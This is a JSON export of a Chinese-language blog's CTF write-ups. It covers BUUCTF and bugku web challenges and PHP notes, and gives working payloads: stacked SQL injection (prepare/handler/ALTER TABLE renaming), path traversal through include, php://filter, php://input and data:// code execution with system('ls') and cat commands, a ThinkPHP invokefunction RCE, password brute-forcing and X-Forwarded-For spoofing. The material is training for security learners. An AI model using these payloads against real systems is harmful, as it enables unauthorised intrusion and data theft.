{"total":9,"pageSize":10,"pageCount":1,"data":[{"title":"buu-随便注","slug":"buu-随便注","date":"2021-01-31T10:20:27.000Z","updated":"2021-02-01T06:44:35.024Z","comments":true,"path":"api/articles/buu-随便注.json","excerpt":"","keywords":null,"cover":"images/buu-sbz1.png","content":"<h1 id=\"buu-web第二题，随便注\"><a href=\"#buu-web第二题，随便注\" class=\"headerlink\" title=\"buu-web第二题，随便注\"></a>buu-web第二题，随便注</h1><p>题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br><img src=\"images/buu-sbz1.png\" alt=\"buu-sbz1.png\"><br>接下来，根据常规操作，判断出字符型注入，两个字段，当我们开心地进行联合注入时，发现<br><img src=\"images/buu-sbz2.png\" alt=\"buu-sbz1.png\"><br>select被注释掉了，也就是不能联合查询找flag了，所以要绕过select，用别的方法。<br>看了好多大佬的wp，说因可以输入多个语句，因此可以用堆叠查询<br>先查数据库（没啥用）<br><img src=\"images/buu-sbz3.png\" alt=\"buu-sbz1.png\"><br>查表如下，有两个<br><img src=\"images/buu-sbz4.png\" alt=\"buu-sbz1.png\"><br>再查表中的列如下，发现了flag<br><img src=\"images/buu-sbz5.png\" alt=\"buu-sbz1.png\">     </p>\n<h2 id=\"方法1-预编译\"><a href=\"#方法1-预编译\" class=\"headerlink\" title=\"方法1.预编译\"></a>方法1.预编译</h2><p>flag在第一个表中，查flag，select被过滤，大佬说用预编译的方式绕过这个过滤，构造     </p>\n<pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from\n`1919810931114514`;&#39;);prepare aaa from @sql;EXECUTE aaa; --+     </code></pre>\n<p>出现如下图,发现还过滤了set和prepare<br><img src=\"images/buu-sbz6.png\" alt=\"buu-sbz1.png\"><br>利用文件上传漏洞大小写绕过，重新构造payload如下：     </p>\n<pre><code>-1&#39;;Set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from\n`1919810931114514`;&#39;);Prepare aaa from @sql;EXECUTE aaa; --+</code></pre>\n<p>欢天喜地，得到flag<br><img src=\"images/buu-sbz7.png\" alt=\"buu-sbz1.png\">    </p>\n<hr>\n<h2 id=\"方法2-handler查询\"><a href=\"#方法2-handler查询\" class=\"headerlink\" title=\"方法2.handler查询\"></a>方法2.handler查询</h2><p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>handler可以用于MyISAM和InnoDB表。<br>使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果。<br>构造payload：</p>\n<pre><code>-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#    </code></pre>\n<p><img src=\"images/buu-sbz8.png\" alt=\"buu-sbz1.png\"><br>简单快捷，恐怖如斯！     </p>\n<hr>\n<h2 id=\"方法3-修改表名和列名\"><a href=\"#方法3-修改表名和列名\" class=\"headerlink\" title=\"方法3.修改表名和列名\"></a>方法3.修改表名和列名</h2><p>由上面知道flag在表“1919810931114514”中，查表words<br><img src=\"images/buu-sbz9.png\" alt=\"buu-sbz1.png\"><br>观察到有一列是data列，可以查询爆内容，我们可以利用数据库修改表名和列名的方法，将我们要查询的表名改成第二个，就可以查询出想要的内容了<br>操作如下：<br>alter table words rename to aaa;先把原来的words表名字改成其他<br>alter table 1919810931114514 rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>构造payload如下：</p>\n<pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>\n<p>然后我们用1’ or 1=1 –+直接就能得到     </p>\n","text":"buu-web第二题，随便注题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br> [Figure] 构造payload如下：1&#39;; alter table words rename to aaaa;alter table `1919810931114514` ren","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"堆叠查询&预编译","slug":"堆叠查询-预编译","count":1,"path":"api/tags/堆叠查询-预编译.json"}]},{"title":"buu-Warmup","slug":"buu-Warmup","date":"2021-01-31T09:28:53.000Z","updated":"2021-01-31T10:19:47.246Z","comments":true,"path":"api/articles/buu-Warmup.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"根据题目得到代码如下，开始代码审计\"><a href=\"#根据题目得到代码如下，开始代码审计\" class=\"headerlink\" title=\"根据题目得到代码如下，开始代码审计\"></a>根据题目得到代码如下，开始代码审计</h2><pre><code>&lt;?php\n    highlight_file(__FILE__);\nclass emmm\n&#123;\n    public static function checkFile(&amp;$page)\n    &#123;\n        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];\n        //得到另外一个文件hint.php，包含得到flag的文件名\n\n        //isset()判断变量是否声明，is_string()判断变量是否是字符串\n        if (! isset($page) || !is_string($page)) &#123;\n            echo &quot;you can&#39;t see it&quot;;\n            return false;\n        &#125;\n\n        //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真\n        if (in_array($page, $whitelist)) &#123;            \n            return true;\n        &#125;\n\n        //过滤问号的函数(如果$page的值有？则从?之前提取字符串)\n        $_page = mb_substr(\n            $page,\n            0,\n            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)\n        );\n\n        //第二次检测传进来的值是否匹配白名单列表$whitelist\n        if (in_array($_page, $whitelist)) &#123;\n            return true;\n        &#125;\n\n        //对$page进行url解码\n        $_page = urldecode($page);\n\n         //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)\n        $_page = mb_substr(\n            $_page,\n            0,\n            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)\n        );\n\n        //第三次检测传进来的值是否匹配白名单列表$whitelist\n        if (in_array($_page, $whitelist)) &#123;\n            return true;\n        &#125;\n\n        //若以上都没通过，则返回false\n        echo &quot;you can&#39;t see it&quot;;\n        return false;\n    &#125;\n&#125;\n\n//---------------------------------------------------------------\n//这里就到了文件包含，需要传入的参数file不为空且是字符串，经过class emmm的检测，即emmm返回真，则包含file    \nif (! empty($_REQUEST[&#39;file&#39;])\n    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])\n    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])\n) &#123;\n    include $_REQUEST[&#39;file&#39;];\n    exit;\n&#125; else &#123;\n    echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;\n&#125;  \n?&gt;</code></pre>\n<hr>\n<p>观察源码发现hint.php，打开发现<br>flag not here, and flag in ffffllllaaaagggg<br>如果满足相应的条件，include引入文件。只需使emmm::checkFile($_REQUEST[‘file’]返回值为true，利用../跳转目录读取flag即可。<br>payload为：file=source.php?/../ffffllllaaaagggg，经过mb_strpos为source.php?/../ffffllllaaaagggg?,  但是mb_strpos这个函数只返回首次出现的位置，所以还是会返回第一个？的位置，而mb_substr截取函数，从0开始截取一直到第一个？的位置，截取内容为source.php，恰好能与白名单中的进行匹配，可以return true;，所以通过第一次截取进行绕过<br>ffffllllaaaagggg文件和index.php不在同一个目录下，所以读取的是上级目录。构造payload <a href=\"http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg%EF%BC%8C%E6%89%BE%E5%88%B0flag%EF%BC%88%E5%88%A9%E7%94%A8/%E4%BD%BFsource.php?%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9C%80%E5%90%8Einclude%E5%88%A9%E7%94%A8../%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96flag%E5%8D%B3%E5%8F%AF%EF%BC%89\">http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg，找到flag（利用/使source.php?成为一个不存在的目录，最后include利用../跳转目录读取flag即可）</a>  </p>\n<ul>\n<li>注意：../ 有多少个不一定，因为不知道flag在底几层目录里，需要从没有开始一次加一个去尝试。</li>\n</ul>\n","text":"根据题目得到代码如下，开始代码审计&lt;?php    highlight_file(__FILE__);class emmm&#123;    public static function checkFile(&amp;$page)    &#123;        $whi","link":"","raw":null,"photos":[],"categories":[],"tags":[]},{"title":"文件包含","slug":"文件包含","date":"2021-01-16T02:15:37.000Z","updated":"2021-01-18T10:09:19.688Z","comments":true,"path":"api/articles/文件包含.json","excerpt":"","keywords":null,"cover":"images/bugku6.1.png","content":"<h1 id=\"文件包含漏洞\"><a href=\"#文件包含漏洞\" class=\"headerlink\" title=\"文件包含漏洞\"></a>文件包含漏洞</h1><p>刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解<a href=\"https://blog.csdn.net/qq_37133717/article/details/94631028\">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>\n<h2 id=\"bugku-6-文件包含-本地包含\"><a href=\"#bugku-6-文件包含-本地包含\" class=\"headerlink\" title=\"bugku-6.文件包含-本地包含\"></a>bugku-6.文件包含-本地包含</h2><p>CSDN大佬讲解：<a href=\"https://blog.csdn.net/qq_39431542/article/details/88628225\">本地文件包含漏洞详解</a><br>第二行可知，flag在flag.php里，倒数第二行show_source(<strong>FILE</strong>)很明显的提示<br>$_REQUEST[]支持get、post两种方式发送过来的请求，很明显接收了hello参数的值，<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值；数组将递归展开值，通过缩进显示其结构<br>eval()函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>show_source() 函数对文件进行语法显示,是 highlight_file() 的别名</p>\n<blockquote>\n<p>本题代码如下<br><img src=\"images/bugku6.1.png\" alt=\"6.1\">   </p>\n<ul>\n<li>可直接将flag.php文件读入变量hello中<br>url输入?hello=file(‘flag.php’)<br><img src=\"images/bugku6.2.png\" alt=\"6.2\">     </li>\n<li>eval存在命令执行漏洞，使用hello构造payload<br><code>index.php?hello=1);show_source(%27flag.php%27);var_dump(3</code><br><img src=\"images/bugku6.3.png\" alt=\"6.3\">    </li>\n</ul>\n</blockquote>\n<hr>\n<h2 id=\"bugku-12-文件包含漏洞\"><a href=\"#bugku-12-文件包含漏洞\" class=\"headerlink\" title=\"bugku-12.文件包含漏洞\"></a>bugku-12.文件包含漏洞</h2><blockquote>\n<p><img src=\"images/bugku12.0.png\" alt=\"12.0\"><br>点<br><img src=\"images/bugku12.1.png\" alt=\"12.1\"><br>观察url : “<a href=\"http://114.67.246.176:16465/index.php?file=show.php&quot;%EF%BC%8C%E7%9C%8B%E5%88%B0file%EF%BC%8C%E6%98%8E%E7%99%BD%E8%BF%99%E5%8F%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E8%81%94%E6%83%B3%E5%88%B0\">http://114.67.246.176:16465/index.php?file=show.php&quot;，看到file，明白这又是文件包含的题目，联想到</a><u>读取index文件，但是直接读取index无法查看，所以就应该考虑用base64方法读取，构造url</u>.<br>构造url=“<a href=\"http://your/\">http://your</a> test ip/index.php?file=php://filter/read=convert.base64-encode/resource=index.php” , 网页返回base64.解码得flag<br><img src=\"images/bugku12.2.png\" alt=\"12.2\"> </p>\n<ul>\n<li>php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。  </li>\n</ul>\n</blockquote>\n<hr>\n<h2 id=\"攻防世界-Web-php-include\"><a href=\"#攻防世界-Web-php-include\" class=\"headerlink\" title=\"攻防世界-Web_php_include\"></a>攻防世界-Web_php_include</h2><p><img src=\"images/gf3.0.png\" alt=\"3.0\"><br>从代码中得知page中带有php://的都会被替换成空<br>    str_replace()以其他字符替换字符串中的一些字符(区分大小写)<br>    strstr() 查找字符串首次出现的位置。返回字符串剩余部分    </p>\n<blockquote>\n<p>方法一<br>1.可以利用PHP的大小写转换，利用PHP://input         </p>\n</blockquote>\n<ul>\n<li>php://filter<br>#执行文件<br>page=Php://filter/resource=index.php<br>#读取文件需要将文件名base64编码   page=Php://filter/read=convert.base64-encode/resource=index.php</li>\n<li>php://input<br>这个协议的利用方法是 将要执行的php代码写在post中提交，不用键与值的形式，只写代码即可。 <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class=\"line\">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;   </span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>用burpsuite在报文中加一句话木马<br><img src=\"images/gf3.1.png\" alt=\"3.1\"><br><img src=\"images/gf3.2.png\" alt=\"3.2\">    </p>\n</blockquote>\n</li>\n</ul>\n<hr>\n<blockquote>\n<p>方法二 data协议    </p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data: text&#x2F;plain,&lt;?php 执行内容 ?&gt;   </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class=\"line\">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;  </span><br></pre></td></tr></table></figure>\n<p> 查看源代码，发现flag     </p>\n<blockquote>\n<p>方法三 http://协议进行绕过<br>利用hello参数将执行内容显示，flag如图所示</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;?hello&#x3D;&lt;? system(&quot;ls&quot;);?&gt;      </span><br></pre></td></tr></table></figure>\n<p><img src=\"images/gf3.3.png\" alt=\"3.3\">   </p>\n<pre><code>?page=http://127.0.0.1/index.php/?hello=&lt;? show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;    </code></pre>\n<p><img src=\"images/gf3.4.png\" alt=\"3.4\"></p>\n","text":"文件包含漏洞刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解https://blog.csdn.net/qq_37133717/article/details/94631028    bugku-6.文件包含-本地包含CSDN大佬讲解：本地文件包含","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"bugku刷到","slug":"bugku刷到","count":1,"path":"api/tags/bugku刷到.json"}]},{"title":"web攻防世界","slug":"web攻防世界","date":"2021-01-13T09:11:31.000Z","updated":"2021-01-18T08:23:36.932Z","comments":true,"path":"api/articles/web攻防世界.json","excerpt":"","keywords":null,"cover":"images/gf1.0.png","content":"<h2 id=\"WAF\"><a href=\"#WAF\" class=\"headerlink\" title=\"WAF\"></a>WAF</h2><p>WAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。</p>\n<h2 id=\"1-Ping命令用法\"><a href=\"#1-Ping命令用法\" class=\"headerlink\" title=\"1.Ping命令用法\"></a>1.Ping命令用法</h2><p><a href=\"https://blog.csdn.net/qq646748739/article/details/81660514\">https://blog.csdn.net/qq646748739/article/details/81660514</a><br>这题没有上waf，也就是可以篡改网站。<br><img src=\"images/gf1.0.png\" alt=\"1.0\"><br><img src=\"images/gf1.1.png\" alt=\"1.1\"><br>发现可以ping通。ping本地<br><img src=\"images/gf1.2.png\" alt=\"1.2\"><br>搜txt文本，查找flag<br><img src=\"images/gf1.3.png\" alt=\"1.3\"><br>找到flag       </p>\n<hr>\n<h2 id=\"2-php-rce（Ping）\"><a href=\"#2-php-rce（Ping）\" class=\"headerlink\" title=\"2.php_rce（Ping）\"></a>2.php_rce（Ping）</h2><p><img src=\"images/gf2.0.png\" alt=\"2.0\">        </p>\n<blockquote>\n<p>RCE英文全称：remote command/code execute 分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>两个基本命令执行：     </p>\n</blockquote>\n<ul>\n<li>?s=index/think\\app/invokefunction&amp;   function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br><u>执行phpinfo()函数：</u>     </li>\n<li>?s=index/\\think\\app/invokefunction&amp;    function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br><img src=\"images/gf2.1.png\" alt=\"2.1\"><br>得到相应的结果,这里就可以直接运行linux命令了<br>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<u >find / -name “flag”</u><br><img src=\"images/gf2.2.png\" alt=\"2.2\"><br>得到目录,直接查看<br>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag /flag<br><img src=\"images/gf2.3.png\" alt=\"2.3\"> </li>\n</ul>\n","text":"WAFWAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。1.Ping命令用法https://blog.csdn.net/qq646748739/article/detail","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"WEB","slug":"WEB","count":1,"path":"api/tags/WEB.json"}]},{"title":"PHP学习笔记","slug":"PHP学习笔记","date":"2021-01-12T06:48:37.000Z","updated":"2021-01-31T10:16:40.377Z","comments":true,"path":"api/articles/PHP学习笔记.json","excerpt":"","keywords":null,"cover":"images/php1.0.png","content":"<h2 id=\"下午搞一搞PHP\"><a href=\"#下午搞一搞PHP\" class=\"headerlink\" title=\"下午搞一搞PHP\"></a>下午搞一搞PHP</h2><hr>\n<h1 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h1><ul>\n<li><p>var_dump() 会返回变量的数据类型和值：</p>\n</li>\n<li><p>在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。<u>所有变量都对大小写敏感</u>  </p>\n</li>\n<li><p>var_dump() 会返回变量的数据类型和值    </p>\n<h3 id=\"字符串函数\"><a href=\"#字符串函数\" class=\"headerlink\" title=\"字符串函数\"></a>字符串函数</h3></li>\n<li><p>str_word_count() 函数对字符串中的单词进行计数  </p>\n</li>\n<li><p>strrev() 函数反转字符串</p>\n</li>\n<li><p>strpos() 函数用于检索字符串内指定的字符或文本<br>如果找到匹配，则会返回首个匹配的<u>字符位置</u>。如果未找到匹配，则将返回 FALSE。下例检索字符串 “Hello world!” 中的文本 “world”：<br><img src=\"images/php1.0.png\" alt=\"php1.0\"></p>\n</li>\n<li><p>str_replace() 函数用一些字符串替换字符串中的另一些字符<br><img src=\"images/php1.2.png\" alt=\"php1.2\">   </p>\n<blockquote>\n<p>+strstr()、strchr()、strrchr()和stristr()：在字符串中查找字符串函数      </p>\n<blockquote>\n<p>函数strstr()有两个变体。第一个变体是stristr()，它几乎和strstr()一样，其区别在于不区分字符大小写<br>第二个变体是strrchr()， 函数查找==字符==（注意：这里是字符不是字符串）在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。<br><img src=\"images/php1.3.png\" alt=\"php1.3\">   </p>\n</blockquote>\n</blockquote>\n</li>\n<li><p>substr()截取字符串前N个字符或者从第几个字符开始取几个字符  </p>\n</li>\n</ul>\n<hr>\n<pre><code>&lt;?php    \n$str = &quot;123456789&quot;;   \necho substr($str , 0 , 3);//从左边第一位字符起截取3位字符：结果：123\necho substr($str , 3 , 3);//从左边第3位字符起截取3位字符：结果：456\n?&gt;   </code></pre>\n<hr>\n<pre><code>&lt;?php\n$rest = substr(&quot;abcdef&quot;, -1);    // 返回 &quot;f&quot;\n$rest = substr(&quot;abcdef&quot;, -2);    // 返回 &quot;ef&quot;\n$rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;\n?&gt;        </code></pre>\n<h2 id=\"2021-1-31\"><a href=\"#2021-1-31\" class=\"headerlink\" title=\"2021.1.31\"></a>2021.1.31</h2><h3 id=\"buu-warmup\"><a href=\"#buu-warmup\" class=\"headerlink\" title=\"buu - warmup\"></a>buu - warmup</h3><ul>\n<li>isset()： 判断变量是否声明；       </li>\n<li>is_string()： 判断变量是否是字符串；     </li>\n<li>in_array(search,array)： 判断array中是否存在search；     </li>\n<li>mb_substr()： 函数返回字符串的一部分    </li>\n<li>mb_strpos（haystack，needle）： 在 haystack 中查找needle第一次出现的位置 ；</li>\n</ul>\n","text":"下午搞一搞PHPphpvar_dump() 会返回变量的数据类型和值：在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。所有变量都对大小写敏感  var_dump() 会返回变量的数据类型和值    字符串函数str_word","link":"","raw":null,"photos":[],"categories":[{"name":"web security","slug":"web-security","count":1,"path":"api/categories/web-security.json"},{"name":"做一顶白帽子","slug":"web-security/做一顶白帽子","count":1,"path":"api/categories/web-security/做一顶白帽子.json"}],"tags":[{"name":"w3school","slug":"w3school","count":1,"path":"api/tags/w3school.json"}]},{"title":"bugku-wp","slug":"bugku-wp","date":"2021-01-12T02:58:03.000Z","updated":"2021-01-16T03:42:05.315Z","comments":true,"path":"api/articles/bugku-wp.json","excerpt":"","keywords":null,"cover":"images/bugku1.1.png","content":"<hr>\n<h2 id=\"1-Url传参-get\"><a href=\"#1-Url传参-get\" class=\"headerlink\" title=\"1.Url传参-get\"></a>1.Url传参-get</h2><blockquote>\n<p>点开链接，出现代码<br><img src=\"images/bugku1.1.png\" alt=\"1.1\"><br>该题考查url传参中的get传参，读代码：如果get参数what的值等于flag则输出flag。（$_GET 传参时请求的参数是在URL中，直接在URL中赋值what变量，找到flag）   在url行输入?what=flag得<br><img src=\"images/bugku1.2.png\" alt=\"1.2\"> </p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"2-Url传参-post\"><a href=\"#2-Url传参-post\" class=\"headerlink\" title=\"2.Url传参-post\"></a>2.Url传参-post</h2><blockquote>\n<p>post传参需用到hackbar,在火狐firefox中打开链接<br>（$_POST 传参是在消息体中，可以借用hackbar插件添加post请求 ）<br><img src=\"images/bugku2.1.png\" alt=\"2.1\"><br>译为：如果post参数what的值等于flag则输出flag.<br>具体方法如下<br><img src=\"images/bugku2.2.png\" alt=\"2.2\">   </p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"3-php弱类型比较-矛盾\"><a href=\"#3-php弱类型比较-矛盾\" class=\"headerlink\" title=\"3.php弱类型比较-矛盾\"></a>3.php弱类型比较-矛盾</h2><blockquote>\n<p>读代码：同时满足get参数num值不为数字，且num==1，得flag,   考察php弱类型比较：php==符号不能判断类型，<u>在数字与字符串比较时会将字符串转化为数字进行比较</u>，可绕过得到flag，<br>则使num=1a可满足条件<br>在url栏输入？num=1a得flag<br><img src=\"images/bugku3.png\" alt=\"3\">  </p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"4-来找我吧\"><a href=\"#4-来找我吧\" class=\"headerlink\" title=\"4.来找我吧\"></a>4.来找我吧</h2><blockquote>\n<p>两个循环出现的赖皮窗口，firefox打开链接，F12查看 源码<br><img src=\"images/bugku4.1.png\" alt=\"4.1\"><br>调试器最下面发现html编码，利用Unicode转码工具，转码得flag<br><img src=\"images/bugku4.2.png\" alt=\"4.2\"></p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"5-你必须让他停下\"><a href=\"#5-你必须让他停下\" class=\"headerlink\" title=\"5.你必须让他停下\"></a>5.你必须让他停下</h2><blockquote>\n<p><img src=\"images/bugku5.1.png\" alt=\"5.1\"><br>网页一直在跳,flag在藏图片源码里    </p>\n<blockquote>\n<p>方法1.F12查源代码，刷新几次得flag<br><img src=\"images/bugku5.2.png\" alt=\"5.2\"><br>方法2.burp suite抓包<br>打开代理服务器（关掉外网）<br>抓包放放放放包<br><img src=\"images/bugku5.3.png\" alt=\"5.3\"><br><img src=\"images/bugku5.4.png\" alt=\"5.4\"></p>\n</blockquote>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"6-文件包含\"><a href=\"#6-文件包含\" class=\"headerlink\" title=\"6.文件包含\"></a>6.文件包含</h2><p>categories-文件包含</p>\n<h2 id=\"7-全局变量\"><a href=\"#7-全局变量\" class=\"headerlink\" title=\"7.全局变量\"></a>7.全局变量</h2><blockquote>\n<p><img src=\"images/bugku7.1.png\" alt=\"7.1\"><br>代码提示flag在变量中，变量为args<br>直接搜索args的全局变量<br><img src=\"images/bugku7.2.png\" alt=\"7.2\">  </p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"8-头等舱\"><a href=\"#8-头等舱\" class=\"headerlink\" title=\"8.头等舱\"></a>8.头等舱</h2><blockquote>\n<p>什么都没有，根据题目提示可知要查看消息头<br>打开开发者工具，network(网络)<br><img src=\"images/bugku8.0.png\" alt=\"8.0\">  </p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"9-后门\"><a href=\"#9-后门\" class=\"headerlink\" title=\"9.后门\"></a>9.后门</h2><blockquote>\n<p><img src=\"images/bugku9.0.png\" alt=\"9.0\"><br>点开链接看到一个很拉风的页面<br><img src=\"images/bugku9.1.png\" alt=\"9.1\"><br>根据提示，可能会有后门，所以直接用恐怖如斯的御剑扫描其后台。<br>输入域名，选中字典们，开始扫描<br><img src=\"images/bugku9.2.png\" alt=\"9.2\"><br>扫出两个路径，URL栏输入index.php没反应<br>输入shell.php出现后台<br><img src=\"images/bugku9.3.png\" alt=\"9.3\"><br>用burp suite爆破密码</p>\n<ul>\n<li>关掉VPN，打开代理服务器(注意burpsuite与代理服务器端口一致为8080)，打开burp suite。  </li>\n<li>在shell.php网页密码处随便填（如123），burpsuite有响应<br><img src=\"images/bugku9.4.png\" alt=\"9.4\"><br>词典选password,  开始爆破start attack<br><img src=\"images/bugku9.5.png\" alt=\"9.5\"><br>爆出密码为hack   </li>\n<li>关掉burpsuite,打开VPN,刷新页面，输入密码hack，得到flag.</li>\n</ul>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"10-本地管理员\"><a href=\"#10-本地管理员\" class=\"headerlink\" title=\"10.本地管理员\"></a>10.本地管理员</h2><blockquote>\n<p><img src=\"images/bugku10.0.png\" alt=\"10.0\"><br>查看源代码发现：“IP禁止访问，请联系本地管理员登陆，IP已被记录.”，<br><img src=\"images/bugku10.1.png\" alt=\"10.1\"><br>且在一串nnnnn后面发现一段base64加密编码!– dGVzdDEyMw== –，在浏览器搜索可得base64解码为：test123（盲猜用户名为admin，密码为test123）<em>其实是我懒得爆破了</em><br>IP禁止访问，需伪造本地IP，伪装成本地管理员进行登录:<br>用burpsuite抓包，修改报文IP：<br>关VPN，改代理服务器端口与burpsuite一致。在网站中输入用户名密码，确定，burpsuite响应<br><img src=\"images/bugku10.2.png\" alt=\"10.2\"><br>http报文添加X-Forwarded-For: 127.0.0.1伪造IP<br>放包send得flag<br><img src=\"images/bugku10.3.png\" alt=\"10.3\">   </p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"11-查看源代码\"><a href=\"#11-查看源代码\" class=\"headerlink\" title=\"11.查看源代码\"></a>11.查看源代码</h2><blockquote>\n<p>进网页，查看源代码，发现几段url编码<br><img src=\"images/bugku11.0.png\" alt=\"11.0\"><br>先解码 再拼接，提交得flag  </p>\n</blockquote>\n<hr>\n<p>+<br>+<br>+</p>\n<h2 id=\"12-文件包含漏洞\"><a href=\"#12-文件包含漏洞\" class=\"headerlink\" title=\"12.文件包含漏洞\"></a>12.文件包含漏洞</h2><p>categories-文件包含<br>+<br>+<br>+</p>\n<h2 id=\"13-备份是个好习惯\"><a href=\"#13-备份是个好习惯\" class=\"headerlink\" title=\"13.备份是个好习惯\"></a>13.备份是个好习惯</h2><blockquote>\n<p>题目提示要用到备份<br> <img src=\"images/bugku13.0.png\" alt=\"13.0\"><br> <em>看题目要用备份，也可以用御剑扫描该网址的后台</em><br> 打开链接是一串字符串，在URL加index.php.bak找到备份文件，下载，用VScode打开，是php代码<br> <img src=\"images/bugku13.1.png\" alt=\"13.1\">   </p>\n</blockquote>\n<ul>\n<li><u>No.11 strstr获得URL中?后（包括?）的字符串名为$str</u><br>strstr函数:strstr(string,search)<br>strstr() 函数搜索一个字符串在另一个字符串中的第一次出现。<br>该函数返回字符串的其余部分（从匹配点）。如果未找到所搜索的字符串，则返回 false。<br>$_SERVER[“REQUEST_URI”]为php预定义服务器变量，获取路径地址（即为获取域名端口后的路径地址）   </li>\n<li><u>No.12 截取$str的第一个字符即?截取到字符结束</u><br>substr()截取字符串前N个字符或者从第几个字符开始取几个字符  </li>\n<li>No.13 <u>str_replace()把字符串$str中的key替换为空</u><br>str_replace() 函数用一些字符串替换字符串中的另一些字符：str_replace(“a”,”b”,”ac”)用b替换ac中的a,结果为bc。   </li>\n<li><u>No.14 parse_str把字符串解析到变量中</u><blockquote>\n<p>代码整体的意思为：从?后开始截取到str中，也就是变量后开始截取字符串；然后从位置1开始截到字符串结束；之后把字符串中的key字段全用‘ 